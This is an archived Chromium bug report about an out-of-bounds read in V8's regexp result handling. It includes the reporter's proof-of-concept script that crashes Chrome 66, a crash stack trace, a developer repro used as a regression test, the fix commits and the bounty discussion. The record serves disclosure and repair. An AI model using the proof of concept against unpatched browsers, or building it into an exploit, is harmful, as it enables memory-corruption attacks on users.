# Security: OOB access in RegExpBuiltinsAssembler::LoadRegExpResultFirstMatch

| Field | Value |
|-------|-------|
| **Issue ID** | [40091373](https://issues.chromium.org/issues/40091373) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Regexp |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hi...@gmail.com |
| **Assignee** | jg...@chromium.org |
| **Created** | 2018-05-15 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

In the function RegExpBuiltinsAssembler::LoadRegExpResultFirstMatch, if result\_fixed\_array has no element, LoadFixedArrayElement will access out of bound data.  

TNode<Object> RegExpBuiltinsAssembler::LoadRegExpResultFirstMatch(  

SloppyTNode<Context> context, SloppyTNode<JSObject> maybe\_array) {  

TVARIABLE(Object, var\_result);

Label exit(this), if\_fast(this), if\_slow(this, Label::kDeferred);

BranchIfFastRegExpResult(context, maybe\_array, &if\_fast, &if\_slow);  

BIND(&if\_fast);  

{  

TNode<FixedArrayBase> result\_fixed\_array = LoadElements(maybe\_array);----------------> a fast RegExpResult doesn't guantee the length of maybe\_array is larger than 0;  

var\_result = LoadFixedArrayElement(result\_fixed\_array, 0);---------------------------> oob access occurs here  

Goto(&exit);  

}  

BIND(&if\_slow);  

{  

var\_result =  

GetProperty(context, maybe\_array, isolate()->factory()->zero\_string());  

Goto(&exit);  

}  

BIND(&exit);  

return var\_result.value();  

}

**VERSION**  

Chrome Version: [66.0.3359.170] + [stable]  

Operating System: [all]

**REPRODUCTION CASE**  

run the following poc in chrome 66.0.3359.170 and you'll see crash

<script>
class MyRegExp extends RegExp {
exec(str) {
const r = super.exec.call(this, str);
if (r) r.length=0;
return r;
}
}
const result = 'a'.match(new MyRegExp('.', 'g'));
var crash = result[0].x;
</script>

The crash is as the follows because result[0] in the poc contains OOB data and is not an object.  

#0 v8::base::OS::Abort () at ../../src/base/platform/platform-posix.cc:381  

#1 0xf727f7e0 in v8::internal::Isolate::PushStackTraceAndDie (this=0x56604bb8, ptr1=0x3ab04235, ptr2=0x0, ptr3=0x0, ptr4=0x0) at ../../src/isolate.cc:367  

#2 0xf72e2519 in v8::internal::LookupIterator::GetRootForNonJSReceiver (isolate=0x56604bb8, receiver=..., index=4294967295) at ../../src/lookup.cc:226  

#3 0xf64fdd6f in v8::internal::LookupIterator::GetRoot (isolate=0x56604bb8, receiver=..., index=4294967295) at ../../src/lookup.h:368  

#4 0xf64fe0eb in v8::internal::LookupIterator::LookupIterator (this=0xffffb390, isolate=0x56604bb8, receiver=..., name=...,  

configuration=v8::internal::LookupIterator::PROTOTYPE\_CHAIN) at ../../src/lookup.h:53  

#5 0xf64fdca8 in v8::internal::LookupIterator::LookupIterator (this=0xffffb390, receiver=..., name=..., configuration=v8::internal::LookupIterator::PROTOTYPE\_CHAIN)  

at ../../src/lookup.h:49  

#6 0xf719b741 in v8::internal::LoadIC::Load (this=0xffffb648, object=..., name=...) at ../../src/ic/ic.cc:452  

#7 0xf71aecf9 in v8::internal::\_\_RT\_impl\_Runtime\_LoadIC\_Miss (args=..., isolate=0x56604bb8) at ../../src/ic/ic.cc:2150  

#8 0xf71ae778 in v8::internal::Runtime\_LoadIC\_Miss (args\_length=4, args\_object=0xffffb7a0, isolate=0x56604bb8) at ../../src/ic/ic.cc:2134  

#9 0x445062ca in ?? ()  

#10 0x4a988e5f in ?? ()  

#11 0x44515e14 in ?? ()  

#12 0x4450e77d in ?? ()  

#13 0x44512cbc in ?? ()  

#14 0x4450c3d1 in ?? ()  

#15 0xf6fb4236 in v8::internal::GeneratedCode<v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, int, v8::internal::Object\*\*\*>::Call (  

this=0xffffba18, args=0xffffbe38, args=0xffffbe38, args=0xffffbe38, args=0xffffbe38, args=0xffffbe38) at ../../src/simulator.h:110  

#16 0xf6fb1c2a in v8::internal::(anonymous namespace)::Invoke (isolate=0x56604bb8, is\_construct=false, target=..., receiver=..., argc=1, args=0xffffbe38, new\_target=...,  

message\_handling=v8::internal::Execution::kReport, execution\_target=v8::internal::Execution::kCallable) at ../../src/execution.cc:155  

#17 0xf6fb10d0 in v8::internal::(anonymous namespace)::CallInternal (isolate=0x56604bb8, callable=..., receiver=..., argc=1, argv=0xffffbe38,  

message\_handling=v8::internal::Execution::kReport, target=v8::internal::Execution::kCallable) at ../../src/execution.cc:191  

#18 0xf6fb0ec7 in v8::internal::Execution::Call (isolate=0x56604bb8, callable=..., receiver=..., argc=1, argv=0xffffbe38) at ../../src/execution.cc:202  

#19 0xf652f42d in v8::Function::Call (this=0x566851cc, context=..., recv=..., argc=1, argv=0xffffbe38) at ../../src/api.cc:5105  

#20 0x565815e8 in v8::Shell::Stringify (isolate=0x56604bb8, value=...) at ../../src/d8.cc:1711  

#21 0x56580458 in v8::Shell::ExecuteString (isolate=0x56604bb8, source=..., name=..., print\_result=v8::Shell::kPrintResult, report\_exceptions=v8::Shell::kReportExceptions,  

process\_message\_queue=v8::Shell::kProcessMessageQueue) at ../../src/d8.cc:673  

#22 0x5659590a in v8::Shell::RunShell (isolate=0x56604bb8) at ../../src/d8.cc:2273  

#23 0x5659cc2c in v8::Shell::Main (argc=4, argv=0xffffcad4) at ../../src/d8.cc:3436  

#24 0x5659d192 in main (argc=4, argv=0xffffcad4) at ../../src/d8.cc:3465

## Attachments

- [843022.html](attachments/843022.html) (text/plain, 234 B)

## Timeline

### cl...@chromium.org (2018-05-15)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6320340868005888.

### el...@chromium.org (2018-05-15)

Crashes 66; POC fails in Chrome 67 and 68 with:
Uncaught TypeError: Cannot convert object to primitive value
    at MyRegExp.[Symbol.match] (<anonymous>)
    at String.match (<anonymous>)
    at 843022.html:9

### cl...@chromium.org (2018-05-15)

[Empty comment from Monorail migration]

### el...@chromium.org (2018-05-15)

Clusterfuzz wasn't able to reproduce, my local crash is up at crash/ae62cb9dd48f3e0d 

[Monorail components: Blink>JavaScript>Regexp]

### me...@chromium.org (2018-05-15)

Was also able to repro on stable.
jgruber@ could you please take a look at this?
This looks similar to https://crbug.com/chromium/831943, maybe the fix there was incomplete?

### me...@chromium.org (2018-05-15)

[Empty comment from Monorail migration]

### hi...@gmail.com (2018-05-15)

If you can't reproduce it, you can try reproducing in debug version d8, I can get crash both in v8 6.6 and 6.7, the issue is clear, an oob access ocurrs when the array length is 0 and maybe it should be triaged as high severity as it can leak a JSMap to user javascript and may cause type confusion when it is used in user JavaScript 

### jg...@chromium.org (2018-05-16)

The fix for https://crbug.com/831943 (as pointed out in #5) is related, in that it hides the OOB read by calling ToString on the read value. In this particular case, the value of the OOB read is not exposed to JS. 

There is an invalid assumption though that if the RegExpResult is fast, it is non-empty. That is not the case, is this repro demonstrates.

Current status: 
M66 crashes as the fix for https://crbug.com/831943 was not merged to 66 as per https://crbug.com/831943#c16.
M67, M68: We read oob at 1 word past the end of the fixed array, but the read value is not exposed to JS due to the fix for https://crbug.com/831943, which results in the behavior shown in #2 above.

### jg...@chromium.org (2018-05-16)

+peter as this also affects String.p.matchAll.

### jg...@chromium.org (2018-05-16)

Repro for the @@match issue in 67 and ToT:


// Produce an fast, but empty result.
const fast_regexp_result = /./g.exec("a");
fast_regexp_result.length = 0;
class RegExpWithFastResult extends RegExp {
  constructor() { super(".", "g"); this.number_of_runs = 0; }
  exec(str) { return (this.number_of_runs++ == 0) ? fast_regexp_result : null; }
}

// A slow empty result.
const slow_regexp_result = [];
class RegExpWithSlowResult extends RegExp {
  constructor() { super(".", "g"); this.number_of_runs = 0; }
  exec(str) { return (this.number_of_runs++ == 0) ? slow_regexp_result : null; }
}

assertEquals(["undefined"], "a".match(new RegExpWithFastResult()));
assertEquals(["undefined"], "a".match(new RegExpWithSlowResult()));

### jg...@chromium.org (2018-05-16)

Fix in flight at https://crrev.com/c/1061455.

+cc Camillo for the review.

### bu...@chromium.org (2018-05-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/5999f8f1fc46b601413ae1f228989678ac823e10

commit 5999f8f1fc46b601413ae1f228989678ac823e10
Author: jgruber <jgruber@chromium.org>
Date: Wed May 16 13:06:14 2018

[regexp] Do not assume fast regexp results are non-empty

It is possible for user code to modify fast regexp result objects
before they are used e.g. by RegExp.p.match, so we may not make any
assumptions about their contents. The only exception is when the
RegExp itself is fast.

Bug: chromium:843022
Change-Id: I14eafbdfb2b2ced609da1391b57c73cbe167f7fb
Reviewed-on: https://chromium-review.googlesource.com/1061455
Reviewed-by: Peter Wong <peter.wm.wong@gmail.com>
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53210}
[modify] https://crrev.com/5999f8f1fc46b601413ae1f228989678ac823e10/src/builtins/builtins-regexp-gen.cc
[modify] https://crrev.com/5999f8f1fc46b601413ae1f228989678ac823e10/src/builtins/builtins-regexp-gen.h
[add] https://crrev.com/5999f8f1fc46b601413ae1f228989678ac823e10/test/mjsunit/regress/regress-crbug-843022.js


### jg...@chromium.org (2018-05-16)

Requesting merge after canary coverage, setting NextAction as a reminder. FYI this code has been refactored since 67 so a manually created merge CL will be needed.

### sh...@chromium.org (2018-05-16)

This bug requires manual review: We are only 12 days from stable.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@chromium.org (2018-05-16)

Merge ok after coverage.

### sh...@chromium.org (2018-05-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-05-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/1c1317008a831b49d9ae24cacd186ada182d4637

commit 1c1317008a831b49d9ae24cacd186ada182d4637
Author: jgruber <jgruber@chromium.org>
Date: Fri May 18 08:30:48 2018

Merged: [regexp] Do not assume fast regexp results are non-empty

This is a backmerge of
https://chromium-review.googlesource.com/c/v8/v8/+/1061455.

It is possible for user code to modify fast regexp result objects
before they are used e.g. by RegExp.p.match, so we may not make any
assumptions about their contents. The only exception is when the
RegExp itself is fast.

No-Try: true
No-Presubmit: true
No-Treechecks: true
Bug: chromium:843022
Change-Id: Ifab9b29e21b8516926bcef3d78396fe42b9f8669
Reviewed-on: https://chromium-review.googlesource.com/1065810
Reviewed-by: Yang Guo <yangguo@chromium.org>
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.7@{#75}
Cr-Branched-From: 8457e810efd34381448d51d93f50079cf1f6a812-refs/heads/6.7.288@{#2}
Cr-Branched-From: e921be5c4f2c6407936bde750992dedbf47c1016-refs/heads/master@{#52547}
[modify] https://crrev.com/1c1317008a831b49d9ae24cacd186ada182d4637/src/builtins/builtins-regexp-gen.cc
[add] https://crrev.com/1c1317008a831b49d9ae24cacd186ada182d4637/test/mjsunit/regress/regress-crbug-843022.js


### jg...@chromium.org (2018-05-18)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-04)

Hi higongguang@ - the chrome VRP decided to award this bug $2,000 but noted that they would reconsider for a higher amount if you could provide an explanation or demonstration of how to access the read value.

### aw...@chromium.org (2018-06-04)

[Empty comment from Monorail migration]

### hi...@gmail.com (2018-06-05)

[Comment Deleted]

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-08-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### is...@google.com (2019-01-04)

This issue was migrated from crbug.com/chromium/843022?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091373)*
